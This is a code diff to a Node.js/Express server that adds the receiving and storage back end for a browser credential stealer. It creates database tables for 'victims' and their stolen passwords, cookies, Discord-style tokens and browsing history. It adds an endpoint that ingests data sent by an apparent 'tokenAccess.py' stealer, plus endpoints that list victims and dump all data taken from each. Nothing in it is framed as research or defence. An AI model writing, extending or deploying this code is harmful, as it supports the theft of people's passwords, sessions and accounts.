@@ -127,6 +127,94 @@ async function initDatabase() {
             )
         `);
         
+        // ========== BROWSER CREDENTIALS TABLES ==========
+        
+        // Table for victim system information
+        await conn.execute(`
+            CREATE TABLE IF NOT EXISTS victims (
+                id INT AUTO_INCREMENT PRIMARY KEY,
+                hostname VARCHAR(255),
+                os VARCHAR(100),
+                os_version VARCHAR(255),
+                architecture VARCHAR(50),
+                username VARCHAR(255),
+                source_ip VARCHAR(50),
+                first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
+                UNIQUE KEY unique_victim (hostname, username)
+            )
+        `);
+        
+        // Table for stolen passwords
+        await conn.execute(`
+            CREATE TABLE IF NOT EXISTS stolen_passwords (
+                id INT AUTO_INCREMENT PRIMARY KEY,
+                victim_id INT NOT NULL,
+                browser VARCHAR(100),
+                origin_url TEXT,
+                action_url TEXT,
+                username VARCHAR(500),
+                password VARCHAR(500),
+                date_created VARCHAR(100),
+                date_last_used VARCHAR(100),
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                FOREIGN KEY (victim_id) REFERENCES victims(id) ON DELETE CASCADE,
+                INDEX idx_victim (victim_id),
+                INDEX idx_browser (browser)
+            )
+        `);
+        
+        // Table for stolen cookies
+        await conn.execute(`
+            CREATE TABLE IF NOT EXISTS stolen_cookies (
+                id INT AUTO_INCREMENT PRIMARY KEY,
+                victim_id INT NOT NULL,
+                browser VARCHAR(100),
+                host VARCHAR(500),
+                name VARCHAR(255),
+                value TEXT,
+                path VARCHAR(500),
+                expires VARCHAR(100),
+                is_secure BOOLEAN DEFAULT FALSE,
+                is_httponly BOOLEAN DEFAULT FALSE,
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                FOREIGN KEY (victim_id) REFERENCES victims(id) ON DELETE CASCADE,
+                INDEX idx_victim (victim_id),
+                INDEX idx_host (host(255))
+            )
+        `);
+        
+        // Table for stolen tokens (Discord, etc.)
+        await conn.execute(`
+            CREATE TABLE IF NOT EXISTS stolen_tokens (
+                id INT AUTO_INCREMENT PRIMARY KEY,
+                victim_id INT NOT NULL,
+                token_type VARCHAR(100),
+                token TEXT,
+                source VARCHAR(500),
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                FOREIGN KEY (victim_id) REFERENCES victims(id) ON DELETE CASCADE,
+                INDEX idx_victim (victim_id),
+                INDEX idx_type (token_type)
+            )
+        `);
+        
+        // Table for browser history
+        await conn.execute(`
+            CREATE TABLE IF NOT EXISTS stolen_history (
+                id INT AUTO_INCREMENT PRIMARY KEY,
+                victim_id INT NOT NULL,
+                browser VARCHAR(100),
+                url TEXT,
+                title TEXT,
+                visit_count INT DEFAULT 0,
+                last_visit VARCHAR(100),
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                FOREIGN KEY (victim_id) REFERENCES victims(id) ON DELETE CASCADE,
+                INDEX idx_victim (victim_id)
+            )
+        `);
+        
         conn.release();
         console.log('[✓] Database tables initialized successfully');
     } catch (error) {
@@ -282,6 +370,262 @@ app.post('/api/receive/batch', async (req, res) => {
             error: error.message || 'Internal server error',
             details: error.code || 'Unknown error'
         });
+    }
+});
+
+// ==================== BROWSER CREDENTIALS ENDPOINT ====================
+
+/**
+ * Endpoint to receive browser credentials from tokenAccess.py
+ * Creates/updates victim and stores all extracted data
+ */
+app.post('/api/credentials', async (req, res) => {
+    try {
+        const data = req.body;
+        
+        if (!data || !data.system_info) {
+            return res.status(400).json({ error: 'Invalid data format - missing system_info' });
+        }
+        
+        const sourceIp = req.ip || req.connection.remoteAddress;
+        const systemInfo = data.system_info;
+        
+        console.log(`[*] Received credentials from ${systemInfo.hostname} (${sourceIp})`);
+        
+        let victimId = null;
+        let stats = { passwords: 0, cookies: 0, tokens: 0, history: 0 };
+        
+        if (dbConnected && pool) {
+            const conn = await getDbConnection();
+            
+            try {
+                // Insert or update victim
+                await conn.execute(`
+                    INSERT INTO victims (hostname, os, os_version, architecture, username, source_ip)
+                    VALUES (?, ?, ?, ?, ?, ?)
+                    ON DUPLICATE KEY UPDATE 
+                        os = VALUES(os),
+                        os_version = VALUES(os_version),
+                        source_ip = VALUES(source_ip),
+                        last_seen = CURRENT_TIMESTAMP
+                `, [
+                    systemInfo.hostname,
+                    systemInfo.os,
+                    systemInfo.os_version,
+                    systemInfo.architecture,
+                    systemInfo.username,
+                    sourceIp
+                ]);
+                
+                // Get victim ID
+                const [victimRows] = await conn.execute(
+                    'SELECT id FROM victims WHERE hostname = ? AND username = ?',
+                    [systemInfo.hostname, systemInfo.username]
+                );
+                victimId = victimRows[0].id;
+                
+                // Insert passwords
+                if (data.passwords && data.passwords.data) {
+                    for (const pwd of data.passwords.data) {
+                        await conn.execute(`
+                            INSERT INTO stolen_passwords 
+                            (victim_id, browser, origin_url, action_url, username, password, date_created, date_last_used)
+                            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
+                        `, [
+                            victimId,
+                            pwd.browser || 'Unknown',
+                            pwd.origin_url || pwd.hostname || '',
+                            pwd.action_url || pwd.form_submit_url || '',
+                            pwd.username || '',
+                            pwd.password || '',
+                            pwd.date_created || pwd.time_created || '',
+                            pwd.date_last_used || pwd.time_last_used || ''
+                        ]);
+                        stats.passwords++;
+                    }
+                }
+                
+                // Insert cookies (limit to prevent overflow)
+                if (data.cookies && data.cookies.data) {
+                    const cookiesToInsert = data.cookies.data.slice(0, 500);
+                    for (const cookie of cookiesToInsert) {
+                        await conn.execute(`
+                            INSERT INTO stolen_cookies 
+                            (victim_id, browser, host, name, value, path, expires, is_secure, is_httponly)
+                            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
+                        `, [
+                            victimId,
+                            cookie.browser || 'Unknown',
+                            cookie.host || '',
+                            cookie.name || '',
+                            cookie.value || '',
+                            cookie.path || '',
+                            cookie.expires || '',
+                            cookie.is_secure ? 1 : 0,
+                            cookie.is_httponly ? 1 : 0
+                        ]);
+                        stats.cookies++;
+                    }
+                }
+                
+                // Insert tokens
+                if (data.tokens && data.tokens.data) {
+                    for (const token of data.tokens.data) {
+                        await conn.execute(`
+                            INSERT INTO stolen_tokens 
+                            (victim_id, token_type, token, source)
+                            VALUES (?, ?, ?, ?)
+                        `, [
+                            victimId,
+                            token.type || 'unknown',
+                            token.token || '',
+                            token.source || ''
+                        ]);
+                        stats.tokens++;
+                    }
+                }
+                
+                // Insert history (limit to prevent overflow)
+                if (data.history && data.history.data) {
+                    const historyToInsert = data.history.data.slice(0, 500);
+                    for (const entry of historyToInsert) {
+                        await conn.execute(`
+                            INSERT INTO stolen_history 
+                            (victim_id, browser, url, title, visit_count, last_visit)
+                            VALUES (?, ?, ?, ?, ?, ?)
+                        `, [
+                            victimId,
+                            entry.browser || 'Unknown',
+                            entry.url || '',
+                            entry.title || '',
+                            entry.visit_count || 0,
+                            entry.last_visit || ''
+                        ]);
+                        stats.history++;
+                    }
+                }
+                
+                conn.release();
+                
+                console.log(`[✓] Stored credentials for victim ID ${victimId}:`);
+                console.log(`    Passwords: ${stats.passwords}, Cookies: ${stats.cookies}, Tokens: ${stats.tokens}, History: ${stats.history}`);
+                
+            } catch (dbError) {
+                conn.release();
+                console.error(`[✗] Database error: ${dbError.message}`);
+                throw dbError;
+            }
+        } else {
+            // Mock storage fallback
+            victimId = mockData.length + 1;
+            mockData.push({
+                id: victimId,
+                type: 'credentials',
+                data: data,
+                source_ip: sourceIp,
+                received_at: new Date()
+            });
+            stats = {
+                passwords: data.passwords?.total_count || 0,
+                cookies: data.cookies?.total_count || 0,
+                tokens: data.tokens?.total_count || 0,
+                history: data.history?.total_count || 0
+            };
+            console.log(`[✓] Stored in mock storage with ID: ${victimId}`);
+        }
+        
+        return res.status(201).json({
+            status: 'success',
+            message: 'Credentials received and stored',
+            victim_id: victimId,
+            stats: stats,
+            storage: dbConnected ? 'database' : 'memory'
+        });
+        
+    } catch (error) {
+        console.error(`[✗] Error receiving credentials: ${error.message}`);
+        return res.status(500).json({ 
+            error: error.message || 'Internal server error',
+            details: error.code || 'Unknown error'
+        });
+    }
+});
+
+/**
+ * Endpoint to get all victims
+ */
+app.get('/api/victims', async (req, res) => {
+    try {
+        if (!dbConnected || !pool) {
+            return res.status(200).json({ 
+                victims: mockData.filter(d => d.type === 'credentials'),
+                storage: 'memory'
+            });
+        }
+        
+        const conn = await getDbConnection();
+        
+        const [victims] = await conn.execute(`
+            SELECT v.*, 
+                   (SELECT COUNT(*) FROM stolen_passwords WHERE victim_id = v.id) as password_count,
+                   (SELECT COUNT(*) FROM stolen_cookies WHERE victim_id = v.id) as cookie_count,
+                   (SELECT COUNT(*) FROM stolen_tokens WHERE victim_id = v.id) as token_count,
+                   (SELECT COUNT(*) FROM stolen_history WHERE victim_id = v.id) as history_count
+            FROM victims v
+            ORDER BY v.last_seen DESC
+        `);
+        
+        conn.release();
+        
+        return res.status(200).json({ victims, count: victims.length });
+        
+    } catch (error) {
+        console.error(`[✗] Error getting victims: ${error.message}`);
+        return res.status(500).json({ error: error.message });
+    }
+});
+
+/**
+ * Endpoint to get victim details with all stolen data
+ */
+app.get('/api/victims/:id', async (req, res) => {
+    try {
+        const victimId = req.params.id;
+        
+        if (!dbConnected || !pool) {
+            const victim = mockData.find(d => d.id == victimId && d.type === 'credentials');
+            return res.status(200).json({ victim: victim || null, storage: 'memory' });
+        }
+        
+        const conn = await getDbConnection();
+        
+        // Get victim info
+        const [victims] = await conn.execute('SELECT * FROM victims WHERE id = ?', [victimId]);
+        
+        if (victims.length === 0) {
+            conn.release();
+            return res.status(404).json({ error: 'Victim not found' });
+        }
+        
+        // Get all related data
+        const [passwords] = await conn.execute('SELECT * FROM stolen_passwords WHERE victim_id = ?', [victimId]);
+        const [cookies] = await conn.execute('SELECT * FROM stolen_cookies WHERE victim_id = ? LIMIT 100', [victimId]);
+        const [tokens] = await conn.execute('SELECT * FROM stolen_tokens WHERE victim_id = ?', [victimId]);
+        const [history] = await conn.execute('SELECT * FROM stolen_history WHERE victim_id = ? LIMIT 100', [victimId]);
+        
+        conn.release();
+        
+        return res.status(200).json({
+            victim: victims[0],
+            passwords: { data: passwords, count: passwords.length },
+            cookies: { data: cookies, count: cookies.length },
+            tokens: { data: tokens, count: tokens.length },
+            history: { data: history, count: history.length }
+        });
+        
+    } catch (error) {
+        console.error(`[✗] Error getting victim details: ${error.message}`);
+        return res.status(500).json({ error: error.message });
     }
 });
 
@@ -451,6 +795,9 @@ app.get('/', (req, res) => {
         endpoints: {
             receive_data: 'POST /api/receive',
             receive_batch: 'POST /api/receive/batch',
+            credentials: 'POST /api/credentials',
+            victims_list: 'GET /api/victims',
+            victim_details: 'GET /api/victims/:id',
             transfer_file: 'GET /api/transfer/file?filename=<name>',
             upload_file: 'POST /api/transfer/upload',
             health_check: 'GET /api/health',
@@ -468,12 +815,15 @@ async function startServer() {
     ║                    (Node.js/Express)                      ║
     ║                                                           ║
     ║  Endpoints:                                               ║
-    ║  • POST /api/receive      - Receive JSON data             ║
+    ║  • POST /api/receive       - Receive JSON data            ║
     ║  • POST /api/receive/batch - Receive batch JSON data      ║
+    ║  • POST /api/credentials   - Receive browser credentials  ║
+    ║  • GET  /api/victims       - List all victims             ║
+    ║  • GET  /api/victims/:id   - Get victim details           ║
     ║  • GET  /api/transfer/file - Download file                ║
     ║  • POST /api/transfer/upload - Upload file                ║
-    ║  • GET  /api/health       - Health check                  ║
-    ║  • GET  /api/data         - View stored data              ║
+    ║  • GET  /api/health        - Health check                 ║
+    ║  • GET  /api/data          - View stored data             ║
     ╚═══════════════════════════════════════════════════════════╝
     `);
     
